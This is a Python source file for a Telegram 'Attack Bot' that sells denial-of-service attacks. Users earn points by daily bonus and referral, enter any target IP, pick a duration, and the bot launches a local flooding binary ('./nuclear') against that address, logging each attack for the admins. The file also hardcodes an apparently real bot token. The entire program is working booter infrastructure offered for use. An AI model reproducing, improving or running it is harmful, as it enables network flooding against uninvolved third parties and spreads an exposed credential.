import logging
import asyncio
import datetime
import subprocess
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import json
import random
from typing import Dict, List
import socket

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Constants
ADMIN_IDS = [7170752236]  # Replace with your Telegram user ID
DAILY_POINTS = 5
REFERRAL_BONUS = 3
UDP_TARGET_PORT = 80  # Default port for UDP attack
ATTACK_BINARY = "./nuclear"  # Binary file name in the same directory

# Data storage
DATA_FILE = "bot_data.json"

# Initialize data structure
data = {
    "users": {},
    "attacks": []
}

# Load data from file if exists
def load_data():
    global data
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
        except Exception as e:
            logger.error(f"Error loading data: {e}")

# Save data to file
def save_data():
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# User functions
def register_user(user_id: int, username: str, referrer_id: int = None):
    if str(user_id) not in data["users"]:
        data["users"][str(user_id)] = {
            "username": username,
            "points": 0,
            "last_daily_bonus": None,
            "referrer_id": referrer_id,
            "referrals": [],
            "is_admin": user_id in ADMIN_IDS
        }
        
        # Handle referral bonus
        if referrer_id and str(referrer_id) in data["users"]:
            data["users"][str(referrer_id)]["points"] += REFERRAL_BONUS
            data["users"][str(referrer_id)]["referrals"].append(user_id)
            data["users"][str(user_id)]["points"] += REFERRAL_BONUS
        
        save_data()
        return True
    return False

def remove_user(user_id: int):
    if str(user_id) in data["users"]:
        del data["users"][str(user_id)]
        save_data()
        return True
    return False

def get_user_info(user_id: int):
    if str(user_id) in data["users"]:
        return data["users"][str(user_id)]
    return None

def add_points(user_id: int, points: int):
    if str(user_id) in data["users"]:
        data["users"][str(user_id)]["points"] += points
        save_data()
        return True
    return False

def deduct_points(user_id: int, points: int):
    if str(user_id) in data["users"] and data["users"][str(user_id)]["points"] >= points:
        data["users"][str(user_id)]["points"] -= points
        save_data()
        return True
    return False

def check_daily_bonus(user_id: int):
    if str(user_id) not in data["users"]:
        return False
    
    user = data["users"][str(user_id)]
    last_bonus = user.get("last_daily_bonus")
    
    if last_bonus is None:
        # First time getting bonus
        user["points"] += DAILY_POINTS
        user["last_daily_bonus"] = datetime.datetime.now().isoformat()
        save_data()
        return True
    
    last_bonus_date = datetime.datetime.fromisoformat(last_bonus)
    now = datetime.datetime.now()
    
    if (now - last_bonus_date).total_seconds() >= 24 * 60 * 60:  # 24 hours
        user["points"] += DAILY_POINTS
        user["last_daily_bonus"] = now.isoformat()
        save_data()
        return True
    
    return False

def get_referral_link(bot_username: str, user_id: int):
    return f"https://t.me/{bot_username}?start={user_id}"

# Attack function
async def perform_attack(target_ip: str, duration: int, user_id: int):
    """Execute the attack binary with the target IP and duration"""
    if not deduct_points(user_id, 1):
        return False, "Not enough points for attack"
    
    # Log the attack
    attack_id = len(data["attacks"]) + 1
    data["attacks"].append({
        "id": attack_id,
        "target": target_ip,
        "duration": duration,
        "user_id": user_id,
        "time": datetime.datetime.now().isoformat()
    })
    save_data()
    
    try:
        # Run the binary with target and duration as parameters
        # Format: ./attacktool <target_ip> <duration>
        cmd = [ATTACK_BINARY, target_ip, str(duration)]
        
        logger.info(f"Executing: {' '.join(cmd)}")
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        # Wait for a short time and then consider the attack launched
        # The actual binary might continue running in the background
        await asyncio.sleep(2)
        
        return True, f"Attack #{attack_id} launched on {target_ip} for {duration} seconds"
    except Exception as e:
        logger.error(f"Attack failed: {str(e)}")
        add_points(user_id, 1)  # Refund the point
        return False, f"Attack failed: {str(e)}"

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    # Check for referral
    referrer_id = None
    if context.args and context.args[0].isdigit():
        referrer_id = int(context.args[0])
    
    register_user(user.id, user.username or user.first_name, referrer_id)
    
    # Check for daily bonus
    check_daily_bonus(user.id)
    
    await main_menu(update, context)

async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_data = get_user_info(user.id)
    
    if not user_data:
        await update.message.reply_text("You are not registered. Use /start to register.")
        return
    
    keyboard = [
        [InlineKeyboardButton("🚀 Attack", callback_data="attack")],
        [InlineKeyboardButton("👤 My Info", callback_data="my_info"), 
         InlineKeyboardButton("💰 My Points", callback_data="my_points")],
        [InlineKeyboardButton("📱 Contact Admin", callback_data="contact_admin"),
         InlineKeyboardButton("🔗 Referral Link", callback_data="refer_link")]
    ]
    
    if user_data["is_admin"]:
        keyboard.append([
            InlineKeyboardButton("➕ Add User", callback_data="add_user"),
            InlineKeyboardButton("➖ Remove User", callback_data="remove_user"),
            InlineKeyboardButton("➕ Add Points", callback_data="add_points")
        ])
        keyboard.append([InlineKeyboardButton("🔐 Admin Panel", callback_data="admin_panel")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.edit_message_text(
            text=f"Welcome to Attack Bot!\nYou have {user_data['points']} points.",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            text=f"Welcome to Attack Bot!\nYou have {user_data['points']} points.",
            reply_markup=reply_markup
        )

async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    user_data = get_user_info(user_id)
    
    if not user_data:
        await query.answer("You are not registered. Use /start to register.")
        return
    
    await query.answer()
    
    if query.data == "attack":
        await attack_menu(update, context)
    elif query.data == "my_info":
        await show_user_info(update, context)
    elif query.data == "my_points":
        await show_points(update, context)
    elif query.data == "contact_admin":
        await contact_admin(update, context)
    elif query.data == "refer_link":
        await show_referral_link(update, context)
    elif query.data == "add_user" and user_data["is_admin"]:
        await add_user_prompt(update, context)
    elif query.data == "remove_user" and user_data["is_admin"]:
        await remove_user_prompt(update, context)
    elif query.data == "add_points" and user_data["is_admin"]:
        await add_points_prompt(update, context)
    elif query.data == "admin_panel" and user_data["is_admin"]:
        await admin_panel(update, context)
    elif query.data == "back_to_main":
        await main_menu(update, context)
    elif query.data == "claim_bonus":
        # Handle daily bonus claim
        if check_daily_bonus(user_id):
            await query.edit_message_text(
                text=f"Daily bonus claimed! You received {DAILY_POINTS} points.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_main")]
                ])
            )
        else:
            await query.edit_message_text(
                text="You have already claimed your daily bonus today.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_main")]
                ])
            )
    elif query.data.startswith("attack_"):
        # Handle attack execution
        target = context.user_data.get("target")
        duration = int(query.data.split("_")[1])
        
        if target:
            await query.edit_message_text(f"Starting attack on {target} for {duration} seconds...")
            success, message = await perform_attack(target, duration, user_id)
            
            back_button = InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_main")]
            ])
            
            await query.edit_message_text(
                text=message,
                reply_markup=back_button
            )
        else:
            await query.edit_message_text(
                text="No target specified. Please try again.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_main")]
                ])
            )

async def attack_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    user_data = get_user_info(user_id)
    
    if user_data["points"] < 1:
        await query.edit_message_text(
            text="You don't have enough points to attack. Each attack costs 1 point.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_main")]
            ])
        )
        return
    
    await query.edit_message_text(
        text="Please enter the target IP address for your attack:",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_main")]
        ])
    )
    
    # Set the state to expect target input
    context.user_data["waiting_for"] = "attack_target"

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = get_user_info(user_id)
    
    if not user_data:
        await update.message.reply_text("You are not registered. Use /start to register.")
        return
    
    waiting_for = context.user_data.get("waiting_for")
    
    if waiting_for == "attack_target":
        target = update.message.text.strip()
        
        # Basic validation
        if len(target) > 0:
            context.user_data["target"] = target
            context.user_data["waiting_for"] = None
            
            keyboard = [
                [InlineKeyboardButton("60 seconds", callback_data="attack_60")],
                [InlineKeyboardButton("120 seconds", callback_data="attack_120")],
                [InlineKeyboardButton("180 seconds", callback_data="attack_180")],
                [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_main")]
            ]
            
            await update.message.reply_text(
                f"Target: {target}\nSelect attack duration:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await update.message.reply_text(
                "Invalid target. Please try again or go back to the main menu.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_main")]
                ])
            )
    elif waiting_for == "add_user_id":
        try:
            new_user_id = int(update.message.text.strip())
            context.user_data["new_user_id"] = new_user_id
            context.user_data["waiting_for"] = "add_user_name"
            await update.message.reply_text("Now enter a username for this user:")
        except ValueError:
            await update.message.reply_text(
                "Invalid user ID. Please enter a numeric ID.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back to Admin Panel", callback_data="admin_panel")]
                ])
            )
    elif waiting_for == "add_user_name":
        new_user_name = update.message.text.strip()
        new_user_id = context.user_data.get("new_user_id")
        
        if register_user(new_user_id, new_user_name):
            await update.message.reply_text(
                f"User {new_user_name} (ID: {new_user_id}) has been added successfully.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back to Admin Panel", callback_data="admin_panel")]
                ])
            )
        else:
            await update.message.reply_text(
                "User already exists.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back to Admin Panel", callback_data="admin_panel")]
                ])
            )
        context.user_data["waiting_for"] = None
    elif waiting_for == "remove_user_id":
        try:
            remove_user_id = int(update.message.text.strip())
            
            if remove_user(remove_user_id):
                await update.message.reply_text(
                    f"User with ID {remove_user_id} has been removed.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("◀️ Back to Admin Panel", callback_data="admin_panel")]
                    ])
                )
            else:
                await update.message.reply_text(
                    "User not found.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("◀️ Back to Admin Panel", callback_data="admin_panel")]
                    ])
                )
            context.user_data["waiting_for"] = None
        except ValueError:
            await update.message.reply_text(
                "Invalid user ID. Please enter a numeric ID.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back to Admin Panel", callback_data="admin_panel")]
                ])
            )
    elif waiting_for == "add_points_id":
        try:
            points_user_id = int(update.message.text.strip())
            context.user_data["points_user_id"] = points_user_id
            context.user_data["waiting_for"] = "add_points_amount"
            
            user_info = get_user_info(points_user_id)
            if user_info:
                await update.message.reply_text(
                    f"User: {user_info['username']} (Current points: {user_info['points']})\n"
                    "Enter the number of points to add:"
                )
            else:
                await update.message.reply_text(
                    "User not found. Please try again or go back to the admin panel.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("◀️ Back to Admin Panel", callback_data="admin_panel")]
                    ])
                )
                context.user_data["waiting_for"] = None
        except ValueError:
            await update.message.reply_text(
                "Invalid user ID. Please enter a numeric ID.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back to Admin Panel", callback_data="admin_panel")]
                ])
            )
    elif waiting_for == "add_points_amount":
        try:
            points_amount = int(update.message.text.strip())
            points_user_id = context.user_data.get("points_user_id")
            
            if add_points(points_user_id, points_amount):
                user_info = get_user_info(points_user_id)
                await update.message.reply_text(
                    f"Added {points_amount} points to user {user_info['username']}.\n"
                    f"New point balance: {user_info['points']}",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("◀️ Back to Admin Panel", callback_data="admin_panel")]
                    ])
                )
            else:
                await update.message.reply_text(
                    "Failed to add points. User not found.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("◀️ Back to Admin Panel", callback_data="admin_panel")]
                    ])
                )
            context.user_data["waiting_for"] = None
        except ValueError:
            await update.message.reply_text(
                "Invalid amount. Please enter a numeric value.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back to Admin Panel", callback_data="admin_panel")]
                ])
            )
    elif waiting_for == "contact_admin_message":
        message = update.message.text
        user = update.effective_user
        
        # Forward message to all admins
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=f"Message from user {user.username or user.first_name} (ID: {user.id}):\n\n{message}"
                )
            except Exception as e:
                logger.error(f"Failed to send message to admin {admin_id}: {e}")
        
        await update.message.reply_text(
            "Your message has been sent to the administrators. They will contact you soon.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_main")]
            ])
        )
        context.user_data["waiting_for"] = None

async def show_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    user_data = get_user_info(user_id)
    
    if not user_data:
        await query.edit_message_text("User not found.")
        return
    
    # Format registration date nicely if available
    referrer_info = ""
    if user_data.get("referrer_id"):
        referrer = get_user_info(user_data["referrer_id"])
        if referrer:
            referrer_info = f"\nReferred by: {referrer['username']}"
    
    referrals_count = len(user_data.get("referrals", []))
    
    info_text = (
        f"👤 User Information\n\n"
        f"Username: {user_data['username']}\n"
        f"User ID: {user_id}\n"
        f"Points: {user_data['points']}\n"
        f"Referrals: {referrals_count}{referrer_info}\n"
        f"Admin: {'Yes' if user_data['is_admin'] else 'No'}"
    )
    
    await query.edit_message_text(
        text=info_text,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_main")]
        ])
    )

async def show_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    user_data = get_user_info(user_id)
    
    if not user_data:
        await query.edit_message_text("User not found.")
        return
    
    # Check if daily bonus is available
    can_claim_bonus = False
    hours_until_next = 0
    
    if user_data.get("last_daily_bonus"):
        last_bonus_date = datetime.datetime.fromisoformat(user_data["last_daily_bonus"])
        now = datetime.datetime.now()
        time_since_bonus = (now - last_bonus_date).total_seconds()
        can_claim_bonus = time_since_bonus >= 24 * 60 * 60
        
        if not can_claim_bonus:
            hours_until_next = (24 - (time_since_bonus / 3600))
    else:
        can_claim_bonus = True
    
    points_text = (
        f"💰 Points Balance: {user_data['points']}\n\n"
        f"Daily Bonus: {DAILY_POINTS} points\n"
    )
    
    if can_claim_bonus:
        points_text += "✅ Daily bonus available! Click below to claim."
        claim_button = [InlineKeyboardButton("🎁 Claim Daily Bonus", callback_data="claim_bonus")]
    else:
        points_text += f"⏳ Next daily bonus in {int(hours_until_next)} hours"
        claim_button = []
    
    keyboard = [
        claim_button,
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_main")]
    ]
    
    await query.edit_message_text(
        text=points_text,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def contact_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    await query.edit_message_text(
        text="Please type your message to the administrators:",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_main")]
        ])
    )
    
    context.user_data["waiting_for"] = "contact_admin_message"

async def show_referral_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    bot_info = await context.bot.get_me()
    bot_username = bot_info.username
    
    referral_link = get_referral_link(bot_username, user_id)
    user_data = get_user_info(user_id)
    referrals_count = len(user_data.get("referrals", []))
    
    referral_text = (
        f"🔗 Your Referral Link:\n{referral_link}\n\n"
        f"Share this link with your friends. Both you and your friend will receive {REFERRAL_BONUS} points when they register using your link.\n\n"
        f"Total Referrals: {referrals_count}"
    )
    
    await query.edit_message_text(
        text=referral_text,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_main")]
        ])
    )

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    user_data = get_user_info(user_id)
    
    if not user_data or not user_data["is_admin"]:
        await query.edit_message_text("You don't have permission to access the admin panel.")
        return
    
    total_users = len(data["users"])
    total_attacks = len(data["attacks"])
    total_points = sum(user["points"] for user in data["users"].values())
    
    admin_text = (
        f"🔐 Admin Panel\n\n"
        f"Total Users: {total_users}\n"
        f"Total Attacks: {total_attacks}\n"
        f"Total Points: {total_points}\n\n"
        "Select an action below:"
    )
    
    keyboard = [
        [InlineKeyboardButton("➕ Add User", callback_data="add_user"),
         InlineKeyboardButton("➖ Remove User", callback_data="remove_user")],
        [InlineKeyboardButton("💰 Add Points", callback_data="add_points")],
        [InlineKeyboardButton("📊 View All Users", callback_data="view_all_users"),
         InlineKeyboardButton("📈 View Attack Log", callback_data="view_attack_log")],
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_main")]
    ]
    
    await query.edit_message_text(
        text=admin_text,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def add_user_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    user_data = get_user_info(user_id)
    
    if not user_data or not user_data["is_admin"]:
        await query.edit_message_text("You don't have permission for this action.")
        return
    
    await query.edit_message_text(
        text="Please enter the Telegram ID of the user you want to add:",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("◀️ Back to Admin Panel", callback_data="admin_panel")]
        ])
    )
    
    context.user_data["waiting_for"] = "add_user_id"

async def remove_user_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    user_data = get_user_info(user_id)
    
    if not user_data or not user_data["is_admin"]:
        await query.edit_message_text("You don't have permission for this action.")
        return
    
    await query.edit_message_text(
        text="Please enter the Telegram ID of the user you want to remove:",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("◀️ Back to Admin Panel", callback_data="admin_panel")]
        ])
    )
    
    context.user_data["waiting_for"] = "remove_user_id"

async def add_points_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    user_data = get_user_info(user_id)
    
    if not user_data or not user_data["is_admin"]:
        await query.edit_message_text("You don't have permission for this action.")
        return
    
    await query.edit_message_text(
        text="Please enter the Telegram ID of the user you want to add points to:",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("◀️ Back to Admin Panel", callback_data="admin_panel")]
        ])
    )
    
    context.user_data["waiting_for"] = "add_points_id"

# Daily task to update points
async def daily_points_update(context: ContextTypes.DEFAULT_TYPE):
    now = datetime.datetime.now()
    logger.info(f"Running daily points update at {now}")
    
    # Reset daily bonus flag for all users
    for user_id in data["users"]:
        user = data["users"][user_id]
        user["last_daily_bonus"] = None
    
    save_data()
    logger.info("Daily points update completed")

def main():
    # Load existing data
    load_data()
    
    # Ensure the attack binary is executable
    if os.path.exists(ATTACK_BINARY):
        os.chmod(ATTACK_BINARY, 0o755)  # Make executable
    else:
        logger.warning(f"Attack binary {ATTACK_BINARY} not found! Attacks will fail.")
    
    # Create the Application
    application = Application.builder().token("7930167469:AAEd4kL8TEKyBh8Tt4q8U0rHMSNKcC_qS1o").build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("menu", main_menu))
    
    # Add callback query handler
    application.add_handler(CallbackQueryHandler(button_click))
    
    # Add message handler for text input
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_input))
    
    # Set up job queue for daily points update
    job_queue = application.job_queue
    job_queue.run_daily(daily_points_update, time=datetime.time(hour=0, minute=0, second=0))
    
    # Start the Bot
    application.run_polling()

if __name__ == '__main__':
    main()